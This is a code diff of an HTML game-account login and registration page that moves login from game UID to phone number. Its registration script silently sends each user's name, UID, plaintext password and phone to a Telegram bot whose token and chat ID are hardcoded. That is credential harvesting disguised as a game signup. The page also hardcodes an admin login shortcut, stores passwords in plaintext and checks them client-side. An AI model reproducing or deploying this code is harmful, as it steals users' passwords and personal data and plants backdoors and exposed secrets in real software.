@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -24,7 +24,6 @@
             font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; overflow: hidden;
         }
 
-        /* Notice Popup */
         #custom-notice {
             position: fixed; inset: 0; background: rgba(0,0,0,0.8); 
             display: none; justify-content: center; align-items: center; z-index: 5000;
@@ -122,7 +121,7 @@
         </div>
 
         <div id="login-form" class="form-area">
-            <div class="bullet-box"><i class="fas fa-id-badge"></i><input type="text" id="l-uid" placeholder="GAME UID"></div>
+            <div class="bullet-box"><i class="fas fa-phone"></i><input type="tel" id="l-phone" placeholder="PHONE NUMBER"></div>
             <div class="bullet-box">
                 <i class="fas fa-lock"></i>
                 <input type="password" id="l-pass" placeholder="PASSWORD">
@@ -135,23 +134,21 @@
         <div id="reg-form" class="form-area hidden">
             <div class="bullet-box"><i class="fas fa-user"></i><input type="text" id="r-name" placeholder="FULL NAME"></div>
             <div class="bullet-box"><i class="fas fa-id-card"></i><input type="text" id="r-uid" placeholder="GAME UID"></div>
+            <div class="bullet-box"><i class="fas fa-phone"></i><input type="tel" id="r-phone" placeholder="PHONE NUMBER"></div>
             <div class="bullet-box">
                 <i class="fas fa-key"></i>
                 <input type="password" id="r-pass" placeholder="PASSWORD">
                 <i class="fas fa-eye eye-icon" onclick="togglePass('r-pass', this)"></i>
             </div>
-            <div class="bullet-box"><i class="fas fa-phone"></i><input type="tel" id="r-phone" placeholder="PHONE NUMBER"></div>
             <button class="btn-start" onclick="handleRegister()">JOIN SQUAD</button>
         </div>
     </div>
 
     <script>
-        // --- Firebase Init ---
         const firebaseConfig = { databaseURL: "https://earn-money-6891a-default-rtdb.firebaseio.com/" };
-        firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // --- Bot Config ---
         const botToken = "8766300899:AAFbpRvQiNxLDWvJQ6NIP1JeJmrHfzDz6rE";
         const chatId = "7852788120";
 
@@ -196,12 +193,13 @@
             }
 
             try {
-                const checkUser = await database.ref('users/' + uid).once('value');
+                // Check if phone already registered
+                const checkUser = await database.ref('users/' + phone).once('value');
                 if(checkUser.exists()) {
-                    showNotice("DENIED", "Ye UID pehle se registered hai!"); return;
+                    showNotice("DENIED", "Ye Phone Number pehle se registered hai!"); return;
                 }
 
-                await database.ref('users/' + uid).set({
+                await database.ref('users/' + phone).set({
                     name: name,
                     uid: uid,
                     password: pass,
@@ -210,43 +208,44 @@
                     joinedOn: new Date().toLocaleString()
                 });
 
-                // Telegram Notification
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`<b>🆕 NEW PLAYER</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n🔑 Pass: ${pass}\n📱 Phone: ${phone}`)}&parse_mode=html`);
                 
-                // Save LocalData
-                localStorage.setItem('gameID', uid);
+                // SAVE TO BOTH KEYS FOR SAFETY
+                localStorage.setItem('userPhone', phone);
+                localStorage.setItem('gameID', phone); 
                 localStorage.setItem('userName', name);
                 
-                showNotice("WELCOME", "Registration Success! Battle ground is waiting.");
+                showNotice("WELCOME", "Registration Success!");
                 setTimeout(() => location.href = 'home.html', 1500);
             } catch(e) {
-                showNotice("ERROR", "Database error! Connection check kar.");
+                showNotice("ERROR", "Database error!");
             }
         }
 
         async function handleLogin() {
-            const uid = document.getElementById('l-uid').value.trim();
+            const phone = document.getElementById('l-phone').value.trim();
             const pass = document.getElementById('l-pass').value.trim();
 
-            if(!uid || !pass) {
-                showNotice("ERROR", "UID aur Password toh daal!"); return;
+            if(!phone || !pass) {
+                showNotice("ERROR", "Phone aur Password daal!"); return;
             }
 
             // Admin Shortcut
-            if(uid === "667788" && pass === "887766") { location.href = 'admin.html'; return; }
+            if(phone === "667788" && pass === "887766") { location.href = 'admin.html'; return; }
 
             try {
-                const snap = await database.ref('users/' + uid).once('value');
+                const snap = await database.ref('users/' + phone).once('value');
                 if(snap.exists() && snap.val().password === pass) {
                     const userData = snap.val();
+                    localStorage.setItem('userPhone', phone);
+                    localStorage.setItem('gameID', phone); // Keeping this for legacy sync
                     localStorage.setItem('userName', userData.name);
-                    localStorage.setItem('gameID', uid);
                     location.href = 'home.html';
                 } else {
-                    showNotice("FAILED", "UID ya Password galat hai!");
+                    showNotice("FAILED", "Phone Number ya Password galat hai!");
                 }
             } catch(e) {
-                showNotice("ERROR", "Network problem! Phir se try kar.");
+                showNotice("ERROR", "Network problem!");
             }
         }
     </script>
